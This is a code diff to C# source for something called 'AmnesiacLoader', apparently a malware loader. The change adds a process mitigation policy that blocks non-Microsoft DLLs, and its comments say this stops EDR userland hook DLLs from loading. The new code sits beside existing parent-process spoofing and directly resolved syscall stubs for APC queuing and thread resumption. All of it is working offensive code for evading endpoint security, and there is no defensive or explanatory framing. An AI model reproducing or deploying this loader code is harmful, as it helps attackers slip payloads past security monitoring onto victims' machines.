@@ -286,7 +286,10 @@ namespace AmnesiacLoader
         const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
         const uint TH32CS_SNAPTHREAD   = 0x00000004;
 
-        const long PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+        const long PROC_THREAD_ATTRIBUTE_PARENT_PROCESS   = 0x00020000;
+        const long PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
+        // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (bit 44)
+        const ulong BLOCK_NON_MS_DLLS = 0x100000000000UL;
 
         // x64 CONTEXT offsets
         const int CTX_FLAGS  = 0x30;
@@ -438,24 +441,34 @@ namespace AmnesiacLoader
                 var NtQueue   = SyscallResolver.GetStub<NtQueueApcThreadDelegate>("NtQueueApcThread");
                 var NtResume  = SyscallResolver.GetStub<NtResumeThreadDelegate>("NtResumeThread");
 
-                // Build PROC_THREAD_ATTRIBUTE_LIST for PPID spoof
+                // Build PROC_THREAD_ATTRIBUTE_LIST for PPID spoof + non-MS DLL block
                 IntPtr parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, spoofParentPid);
                 if (parentHandle == IntPtr.Zero) return false;
 
                 IntPtr attrListSize = IntPtr.Zero;
-                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrListSize);
+                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref attrListSize);
                 IntPtr attrList = Marshal.AllocHGlobal(attrListSize.ToInt32());
 
-                if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrListSize))
+                if (!InitializeProcThreadAttributeList(attrList, 2, 0, ref attrListSize))
                 { Marshal.FreeHGlobal(attrList); CloseHandle(parentHandle); return false; }
 
-                // Pin handle value so the pointer stays valid during CreateProcessW
+                // Attribute 1: PPID spoof
                 GCHandle pin = GCHandle.Alloc(parentHandle, GCHandleType.Pinned);
                 UpdateProcThreadAttribute(
                     attrList, 0,
                     new IntPtr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                     pin.AddrOfPinnedObject(),
                     new IntPtr(IntPtr.Size),
+                    IntPtr.Zero, IntPtr.Zero);
+
+                // Attribute 2: block non-Microsoft DLLs — EDR userland hook DLLs cannot load
+                ulong[] mitPolicy = new ulong[1] { BLOCK_NON_MS_DLLS };
+                GCHandle pinMit = GCHandle.Alloc(mitPolicy, GCHandleType.Pinned);
+                UpdateProcThreadAttribute(
+                    attrList, 0,
+                    new IntPtr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                    pinMit.AddrOfPinnedObject(),
+                    new IntPtr(8),
                     IntPtr.Zero, IntPtr.Zero);
 
                 var si = new STARTUPINFOEX();
@@ -470,6 +483,7 @@ namespace AmnesiacLoader
                     IntPtr.Zero, null, ref si, out pi);
 
                 pin.Free();
+                pinMit.Free();
                 DeleteProcThreadAttributeList(attrList);
                 Marshal.FreeHGlobal(attrList);
                 CloseHandle(parentHandle);
@@ -519,17 +533,28 @@ namespace AmnesiacLoader
                 if (parentHandle == IntPtr.Zero) return false;
 
                 IntPtr attrListSize = IntPtr.Zero;
-                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrListSize);
+                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref attrListSize);
                 IntPtr attrList = Marshal.AllocHGlobal(attrListSize.ToInt32());
-                if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrListSize))
+                if (!InitializeProcThreadAttributeList(attrList, 2, 0, ref attrListSize))
                 { Marshal.FreeHGlobal(attrList); CloseHandle(parentHandle); return false; }
 
+                // PPID spoof
                 GCHandle pin = GCHandle.Alloc(parentHandle, GCHandleType.Pinned);
                 UpdateProcThreadAttribute(
                     attrList, 0,
                     new IntPtr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                     pin.AddrOfPinnedObject(),
                     new IntPtr(IntPtr.Size),
+                    IntPtr.Zero, IntPtr.Zero);
+
+                // Block non-Microsoft DLLs — EDR userland hook DLLs cannot load
+                ulong[] mitPolicy = new ulong[1] { BLOCK_NON_MS_DLLS };
+                GCHandle pinMit = GCHandle.Alloc(mitPolicy, GCHandleType.Pinned);
+                UpdateProcThreadAttribute(
+                    attrList, 0,
+                    new IntPtr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
+                    pinMit.AddrOfPinnedObject(),
+                    new IntPtr(8),
                     IntPtr.Zero, IntPtr.Zero);
 
                 var si = new STARTUPINFOEX();
@@ -544,6 +569,7 @@ namespace AmnesiacLoader
                     IntPtr.Zero, null, ref si, out pi);
 
                 pin.Free();
+                pinMit.Free();
                 DeleteProcThreadAttributeList(attrList);
                 Marshal.FreeHGlobal(attrList);
                 CloseHandle(parentHandle);
